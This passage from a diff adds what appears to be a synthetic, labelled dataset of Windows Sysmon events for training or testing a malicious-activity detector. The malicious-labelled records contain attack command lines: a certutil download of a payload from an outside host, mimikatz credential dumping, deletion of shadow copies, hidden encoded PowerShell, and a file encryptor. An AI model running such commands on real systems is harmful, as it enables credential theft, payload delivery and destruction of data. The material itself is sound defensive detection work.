+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
